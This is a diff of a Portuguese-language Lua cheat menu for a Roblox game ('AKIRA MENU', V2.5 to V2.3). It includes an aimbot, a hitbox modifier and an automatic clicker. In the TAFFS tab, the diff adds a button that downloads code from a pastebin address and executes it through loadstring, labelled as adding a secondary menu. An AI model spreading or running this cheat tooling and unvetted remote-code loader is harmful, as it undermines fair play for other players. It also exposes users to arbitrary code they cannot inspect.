@@ -1,11 +1,10 @@
 -- =========================================================================
--- AKIRA MENU V2.5 — Arquivo completo
---  • Abre por padrão em CRÉDITOS
---  • Auto JJS completo (todos os controles)
---  • Combate completo (Hitbox + Aim inteiros)
---  • Animação de andar só quando realmente anda
---  • TAFFS sem aviso de menu secundário
---  • Aba EXTRAS com Zoom Unlock
+-- AKIRA MENU V2.3 — Arquivo completo
+--  • Auto JJS confiável
+--  • Gerador IA (EB) em formato <<<...>>>
+--  • Corretor gramatical com prompt enxuto
+--  • Animação de andar cacheada + playback suave
+--  • Kill-switch global (evita threads duplicadas)
 -- =========================================================================
 
 -- Kill-switch global
@@ -185,7 +184,7 @@ local towerRoutes = {["Torre 1"]={},["Torre 2"]={Frente={},["Atrás"]={},Esquerd
 local selectedCategory = {}
 for i=1,4 do selectedCategory[i]="Lento" end
 local selectedTower2Route = "Frente"
-local CurrentPage = "Creditos"  -- ✅ abre em CRÉDITOS
+local CurrentPage = "EBDelta"
 local lineFolder
 local linesVisible = true
 local mostrarLinhas = true
@@ -327,26 +326,12 @@ local function pararAnimacaoAndar()
     end
 end
 
-local ultimaPosAnim
-local ultimoTempoMov = 0
 task.spawn(function()
     while alive() do
         task.wait(0.08)
-        if RefreshCharacter() then
-            local pos = rootPart.Position
-            if ultimaPosAnim then
-                local delta = (pos - ultimaPosAnim).Magnitude
-                if delta > 0.06 then
-                    ultimoTempoMov = os.clock()
-                end
-            end
-            ultimaPosAnim = pos
-
+        if Playback.Running and not Playback.WalkingToStart and RefreshCharacter() then
             local noChao = humanoid.FloorMaterial ~= Enum.Material.Air
-            local aindaMovendo = (os.clock() - ultimoTempoMov) < 0.2
-            local naRota = Playback.Running and not Playback.WalkingToStart
-
-            if naRota and noChao and aindaMovendo then
+            if noChao then
                 if not walkTrack or not walkTrack.IsPlaying then
                     iniciarAnimacaoAndar()
                 end
@@ -356,7 +341,6 @@ task.spawn(function()
                 end
             end
         else
-            ultimaPosAnim = nil
             if walkTrack and walkTrack.IsPlaying then
                 pararAnimacaoAndar()
             end
@@ -753,6 +737,7 @@ end
 -- FUNÇÕES DA IA
 -- =========================================================================
 
+-- ========== CORRETOR GRAMATICAL ==========
 local function CorrigirTexto(texto)
     if not httpRequest then return nil,"Executor sem suporte a HTTP" end
     local corpo=HS:JSONEncode({
@@ -795,6 +780,7 @@ local function CorrigirTexto(texto)
     return txt
 end
 
+-- ========== GERADOR DE TEXTOS EB ==========
 local function GerarTextoPronto(tema)
     if not httpRequest then return nil,"Executor sem suporte a HTTP" end
     if not tema or tema=="" then return nil,"Tema vazio" end
@@ -885,7 +871,7 @@ Subtitle.TextSize=9 Subtitle.Font=_GM Subtitle.TextXAlignment=_XL Subtitle.ZInde
 
 local Version=_I("TextLabel")
 Version.BackgroundColor3=_K.Card Version.AnchorPoint=_V2(.5,.5)
-Version.Position=_U2(.5,0,.5,0) Version.Size=_UO(55,25) Version.Text="V2.5"
+Version.Position=_U2(.5,0,.5,0) Version.Size=_UO(55,25) Version.Text="V2.3"
 Version.TextColor3=_K.Gray Version.TextSize=10 Version.Font=_GB
 Version.ZIndex=22 Version.Parent=Header Corner(Version,8) Stroke(Version,_K.Stroke)
 
@@ -918,17 +904,15 @@ local function SideButton(text,selected)
     return b
 end
 
--- ✅ CRÉDITOS é a aba selecionada por padrão
-local creditosButton = SideButton("👑 CRÉDITOS", true)
-local ebDeltaButton  = SideButton("🚀 EB DELTA", false)
-local taffsButton    = SideButton("📝 TAFFS", false)
+local creditosButton = SideButton("👑 CRÉDITOS", false)
+local ebDeltaButton  = SideButton("🚀 EB DELTA", true)
+local taffsButton    = SideButton("📝 TAFFS")
 local volversButton  = SideButton("↪ VOLVERS", false)
 local iaButton       = SideButton("🤖 IA CHAT", false)
 local combateButton  = SideButton("🎯 COMBATE", false)
 local textosButton   = SideButton("📚 TEXTOS PRONTOS", false)
 local lojaButton     = SideButton("🔫 LOJA", false)
-local extrasButton   = SideButton("🔓 EXTRAS", false)
-local selectedButton = creditosButton
+local selectedButton = ebDeltaButton
 
 local Content=_I("ScrollingFrame")
 Content.Size=_U2(1,-134,1,-78) Content.Position=_U2(0,126,0,70)
@@ -1022,7 +1006,6 @@ function UI.Toggle(parent, ordem, texto, inicial, callback)
     end
     aplicar(est)
     sw.MouseButton1Click:Connect(function() aplicar(not est) callback(est) end)
-    row.SetToggle = aplicar
     return row
 end
 
@@ -1372,7 +1355,7 @@ local function CreateTwoColumns(parent, ordem)
 end
 
 -- =========================================================================
--- TAFFS (sem aviso de menu secundário)
+-- TAFFS
 -- =========================================================================
 local TAFFS_DATA = {
     { Name="TAF (CIGS)", Emoji="🐅", Color=_RGB(255, 180, 50), Fields={
@@ -1500,10 +1483,38 @@ end
 local function ShowTAFFS()
     CurrentPage="TAFFS"
     ClearContent()
-
+    local warningCard=_I("Frame")
+    warningCard.Size=_U2(1,0,0,70) warningCard.BackgroundColor3=_RGB(45,35,20)
+    warningCard.BorderSizePixel=0 warningCard.LayoutOrder=0 warningCard.Parent=_CH
+    Corner(warningCard,8) Stroke(warningCard,_K.Orange,1.5)
+    local warnIcon=_I("TextLabel")
+    warnIcon.BackgroundTransparency=1 warnIcon.Position=_UO(12,8) warnIcon.Size=_UO(30,30)
+    warnIcon.Text="⚠️" warnIcon.TextSize=20 warnIcon.TextColor3=_K.White
+    warnIcon.Font=_GB warnIcon.TextXAlignment=_XC
+    warnIcon.TextYAlignment=Enum.TextYAlignment.Center warnIcon.Parent=warningCard
+    local warnText=_I("TextLabel")
+    warnText.BackgroundTransparency=1 warnText.Position=_UO(48,8)
+    warnText.Size=_U2(1,-130,0,35)
+    warnText.Text="Deseja adicionar as informações TAFFS em um menu secundário?"
+    warnText.TextColor3=_K.White warnText.TextSize=10 warnText.Font=_GB
+    warnText.TextWrapped=true warnText.TextXAlignment=_XL
+    warnText.TextYAlignment=Enum.TextYAlignment.Top warnText.Parent=warningCard
+    local simBtn=_I("TextButton")
+    simBtn.AnchorPoint=_V2(1,.5) simBtn.Position=_U2(1,-12,.5,0)
+    simBtn.Size=_UO(70,34) simBtn.BackgroundColor3=_K.Success
+    simBtn.BorderSizePixel=0 simBtn.Text="▶ SIM" simBtn.TextColor3=_K.White
+    simBtn.TextSize=10 simBtn.Font=_GB simBtn.AutoButtonColor=false simBtn.Parent=warningCard
+    Corner(simBtn,8)
+    simBtn.MouseButton1Click:Connect(function()
+        local ok = pcall(function()
+            loadstring(game:HttpGet("https://pastebin.com/raw/yyp8u4Xt"))()
+        end)
+        if ok then Notify("MENU SECUNDÁRIO","TAFFS adicionado com sucesso!","Success")
+        else Notify("ERRO","Falha ao carregar o menu secundário.","Error") end
+    end)
     local header=_I("Frame")
     header.Size=_U2(1,0,0,58) header.BackgroundColor3=_K.Card header.BorderSizePixel=0
-    header.LayoutOrder=0 header.Parent=_CH Corner(header,9) Stroke(header,_K.StrokeLight,1)
+    header.LayoutOrder=1 header.Parent=_CH Corner(header,9) Stroke(header,_K.StrokeLight,1)
     local title=_I("TextLabel")
     title.BackgroundTransparency=1 title.Position=_UO(12,7) title.Size=_U2(1,-24,0,25)
     title.Text="📝 TAFFS" title.TextColor3=_K.White title.TextSize=16
@@ -1516,7 +1527,7 @@ local function ShowTAFFS()
         local section=_I("Frame")
         section.Size=_U2(1,0,0,0) section.AutomaticSize=Enum.AutomaticSize.Y
         section.BackgroundColor3=_K.Card section.BorderSizePixel=0
-        section.LayoutOrder=idx section.Parent=_CH
+        section.LayoutOrder=idx+1 section.Parent=_CH
         Corner(section,8) Stroke(section,div.Color,2)
         local sectionLayout=_I("UIListLayout")
         sectionLayout.FillDirection=Enum.FillDirection.Vertical
@@ -1538,50 +1549,6 @@ local function ShowTAFFS()
         end
     end
     Content.CanvasPosition=_V2()
-end
-
--- =========================================================================
--- EXTRAS (Zoom Unlock)
--- =========================================================================
-local zoomUnlockAtivo = false
-local zoomOriginalMax = Pl.CameraMaxZoomDistance
-
-local function setZoomUnlock(ligado)
-    zoomUnlockAtivo = ligado
-    if ligado then
-        Pl.CameraMaxZoomDistance = 1000
-    else
-        Pl.CameraMaxZoomDistance = zoomOriginalMax
-    end
-end
-
-local function ShowExtras()
-    CurrentPage = "Extras"
-    ClearContent()
-
-    local col1, col2 = CreateTwoColumns(_CH, 1)
-
-    local card = UI.Card(col1, 1, "🔍 Zoom Unlock")
-
-    UI.Toggle(card, 1, "Tirar limite de zoom", zoomUnlockAtivo, function(v)
-        setZoomUnlock(v)
-        if v then Notify("ZOOM","Limite de zoom removido (máx 1000).","Success")
-        else Notify("ZOOM","Zoom restaurado ao padrão.","Orange") end
-    end)
-
-    local desc = _I("TextLabel", card)
-    desc.Size = _U2(1, 0, 0, 50)
-    desc.BackgroundTransparency = 1
-    desc.Text = "Permite afastar a câmera muito mais do que o normal, para enxergar o mapa todo."
-    desc.TextColor3 = _K.Gray
-    desc.Font = _GM
-    desc.TextSize = 10
-    desc.TextWrapped = true
-    desc.TextXAlignment = _XL
-    desc.TextYAlignment = Enum.TextYAlignment.Top
-    desc.LayoutOrder = 2
-
-    Content.CanvasPosition = _V2()
 end
 
 -- =========================================================================
@@ -1668,21 +1635,19 @@ local function ShowTowersContent()
     end
 end
 
--- =========================================================================
--- AUTO JJS (completo)
--- =========================================================================
 local ShowAutomacaoContent
 do
     local ativo,VELOCIDADE,MAX_CLIQUES,META,META_ATIVA=false,53,2,308,true
     local jjsFeitos,bolhasVistas,cliquesTotal,ultimaBolhaVista=0,{},0,0
-    local toggleRowRef,infoLbl
+    local btnToggleRef,infoLbl
+    local SESSION = os.clock()   -- marca esta sessão p/ auto JJS
 
     local function setBtnEstado(ligado)
-        if toggleRowRef and toggleRowRef.SetToggle then
-            toggleRowRef.SetToggle(ligado)
-        end
+        if not btnToggleRef or not btnToggleRef.Parent then return end
+        btnToggleRef.Text = ligado and "Parar Auto JJS" or "Iniciar Auto JJS"
     end
 
+    -- ✅ firesignal seguro: tenta cada signal individualmente
     local function clicarFiresignal(obj)
         if firesignal then
             pcall(firesignal, obj.MouseButton1Down)
@@ -1695,6 +1660,7 @@ do
         pcall(function() obj.MouseButton1Click:Fire() end)
     end
 
+    -- ✅ Detecção mais tolerante: nome OU heurística de posição/tamanho
     local function ehBolha(obj)
         if not obj:IsA("ImageButton") then return false end
         if not obj.Visible then return false end
@@ -1702,6 +1668,7 @@ do
         if s.X<20 or s.Y<20 or s.X>200 or s.Y>200 then return false end
         local p=obj.AbsolutePosition
         if p.X<=0 or p.Y<=0 then return false end
+        -- aceita nome "InputTemplate" (jogo atual) ou qualquer botão nessa faixa
         if obj.Name=="InputTemplate" then return true end
         return false
     end
@@ -1712,6 +1679,7 @@ do
         return math.floor(cx/40).."_"..math.floor(cy/40)
     end
 
+    -- ✅ Loop principal: clica TODAS as bolhas visíveis (não só 1 por frame)
     task.spawn(function()
         while alive() do
             task.wait(0.08)
@@ -1724,6 +1692,7 @@ do
             end
             local delayAtual=VELOCIDADE/100
             local agora=tick()
+            -- limpa bolhas antigas
             for id,dados in pairs(bolhasVistas) do
                 if agora-dados.t>2.5 then bolhasVistas[id]=nil end
             end
@@ -1773,17 +1742,7 @@ do
     ShowAutomacaoContent=function()
         local card = UI.Card(_CH, 1, "Auto JJS")
 
-        toggleRowRef = UI.Toggle(card, 1, "Ativar Auto JJS", ativo, function(v)
-            ativo = v
-            if v then
-                if META_ATIVA and jjsFeitos >= META then
-                    jjsFeitos = 0
-                    cliquesTotal = 0
-                    bolhasVistas = {}
-                end
-                ultimaBolhaVista = tick()
-            end
-        end)
+        UI.Toggle(card, 1, "Ativar Auto JJS", ativo, function(v) ativo = v end)
 
         local metaBox
         local function updateMetaBoxState()
@@ -1829,7 +1788,18 @@ do
         infoLbl.TextXAlignment = _XL
         infoLbl.LayoutOrder = 5
 
-        UI.ActionButton(card, 6, "Resetar Contador", _RGB(24,24,30), function()
+        btnToggleRef = UI.ActionButton(card, 6, "Iniciar Auto JJS", _RGB(28,28,36), function()
+            if not ativo and jjsFeitos >= META then
+                jjsFeitos = 0
+                cliquesTotal = 0
+                bolhasVistas = {}
+            end
+            ativo = not ativo
+            setBtnEstado(ativo)
+            if ativo then ultimaBolhaVista=tick() end
+        end)
+
+        UI.ActionButton(card, 7, "Resetar Contador", _RGB(24,24,30), function()
             jjsFeitos = 0
             cliquesTotal = 0
             bolhasVistas = {}
@@ -2006,7 +1976,7 @@ local function ShowVolvers()
 end
 
 -- =========================================================================
--- IA CHAT
+-- IA CHAT (CORRIGIR E ENVIAR NO CHAT)
 -- =========================================================================
 local iaOcupado=false
 local function ShowAutoCorrecao()
@@ -2390,6 +2360,11 @@ do
         aiHeader.BorderSizePixel = 0
         aiHeader.LayoutOrder = 1
         Corner(aiHeader, 8)
+        local aiMask = _I("Frame", aiHeader)
+        aiMask.Size = _U2(1, 0, 0.5, 0)
+        aiMask.Position = _U2(0, 0.5, 0, 0)
+        aiMask.BackgroundColor3 = _RGB(139, 92, 246)
+        aiMask.BorderSizePixel = 0
         local aiTitle = _I("TextLabel", aiHeader)
         aiTitle.Size = _U2(1, -20, 0, 20)
         aiTitle.Position = _UO(10, 8)
@@ -2426,6 +2401,9 @@ do
         btnGerar.TextSize = 12 btnGerar.BorderSizePixel = 0
         btnGerar.AutoButtonColor = false Corner(btnGerar, 8)
         Stroke(btnGerar, _RGB(167, 139, 250), 1, 0.2)
+        local btnGrad = _I("UIGradient", btnGerar)
+        btnGrad.Color = ColorSequence.new(_RGB(139, 92, 246), _RGB(109, 40, 217))
+        btnGrad.Rotation = 90
         btnGerar.MouseEnter:Connect(function() btnGerar.BackgroundColor3 = _RGB(167, 139, 250) end)
         btnGerar.MouseLeave:Connect(function() btnGerar.BackgroundColor3 = _RGB(139, 92, 246) end)
         local outputLabel = _I("TextLabel", aiBody)
@@ -2658,7 +2636,6 @@ function ShowCombate()
 
     local col1, col2 = CreateTwoColumns(_CH, 0)
 
-    -- COLUNA 1: Hitbox Modificador
     local hbCard = UI.Card(col1, 1, "🎯 Hitbox Modificador")
     UI.Toggle(hbCard, 1, "Ativar Hitbox", HB_CONFIG.Ativo, function(v)
         HB_CONFIG.Ativo = v
@@ -2720,7 +2697,6 @@ function ShowCombate()
         end)
     end
 
-    -- COLUNA 2: Aim
     local aimCard = UI.Card(col2, 1, "🎯 Aim")
     UI.Toggle(aimCard, 1, "Ativar Aimbot", AIM_CONFIG.Ativo, function(v)
         AIM_CONFIG.Ativo = v
@@ -2963,9 +2939,6 @@ local function SelectButton(b)
     b.TextColor3=_K.White
 end
 
-extrasButton.MouseButton1Click:Connect(function()
-    SelectButton(extrasButton) ShowExtras()
-end)
 ebDeltaButton.MouseButton1Click:Connect(function()
     SelectButton(ebDeltaButton) ShowEBDelta()
 end)
@@ -3053,7 +3026,7 @@ end)
 Close.MouseButton1Click:Connect(CloseMenu)
 
 -- =========================================================================
--- CARREGAR ROTAS (abre em CRÉDITOS)
+-- CARREGAR ROTAS
 -- =========================================================================
 task.defer(function()
     local loaded=0
@@ -3065,9 +3038,9 @@ task.defer(function()
     for _,rn in ipairs(Tower2RouteOrder) do
         if LoadTowerRoute("Torre 2",rn) then lt2+=1 end
     end
-    ShowCreditos()   -- ✅ aba inicial
+    ShowEBDelta()
     Notify("ZKY PARKOUR",loaded.."/4 parkours • Torre 1: "..(lt1 and "OK" or "ERRO").." • Torre 2: "..lt2.."/4",
         loaded==4 and lt1 and lt2==4 and "Success" or "Error")
 end)
 
-print("AKIRA MENU V2.5 carregado com sucesso!")
+print("AKIRA MENU V2.3 carregado com sucesso!")
